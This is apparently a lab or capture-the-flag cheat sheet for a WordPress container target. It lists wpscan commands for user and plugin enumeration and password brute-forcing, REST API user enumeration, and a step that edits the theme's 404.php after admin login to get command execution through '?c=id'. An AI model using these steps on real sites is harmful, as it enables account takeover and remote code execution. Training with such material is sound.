# Cheatsheet — Pressing Matters

## Targets

- **wp01** — WordPress on :80, MySQL on the backend docker net

## Useful commands

```bash
wpscan --url http://<ip>/                        # fingerprint everything
wpscan --url http://<ip>/ -e u                   # enumerate users
wpscan --url http://<ip>/ -e ap,at               # plugins + themes
wpscan --url http://<ip>/ -U admin -P <wordlist> # password attack
# kali wordlists: /usr/share/wordlists/metasploit/unix_passwords.txt
# or: zcat /usr/share/wordlists/rockyou.txt.gz > ~/rockyou.txt

curl -s http://<ip>/wp-json/wp/v2/users          # user enum without tools
gobuster dir -u http://<ip>/ -w <list>           # /wp-content/uploads/

# after wp-admin: Appearance → Theme File Editor → 404.php
# trigger: curl 'http://<ip>/nonexistent?c=id'  (404 template executes)
```

## Concepts

- `?author=N` and the REST API hand out valid usernames — enumeration is free
- wp-admin is "authenticated", not "safe": file editors make it an RCE bridge
- Container ≠ boundary: a shell inside the container reads everything in it
